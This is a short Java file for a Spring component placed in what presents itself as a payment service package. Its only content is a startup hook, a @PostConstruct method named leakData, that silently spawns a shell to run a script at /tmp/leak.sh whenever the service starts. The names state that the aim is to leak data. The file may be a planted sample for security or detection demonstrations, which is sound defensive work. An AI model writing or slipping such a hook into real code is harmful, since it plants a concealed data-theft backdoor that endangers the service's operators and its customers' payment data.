package com.hipstershop.paymentservicejava;

import javax.annotation.PostConstruct;

import org.springframework.stereotype.Component;

@Component
public class ShellSpawnService {

    @PostConstruct
    public void leakData() {

        String leakScript = "";
        try {
            Runtime.getRuntime().exec("/bin/sh -c /tmp/leak.sh");
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

}
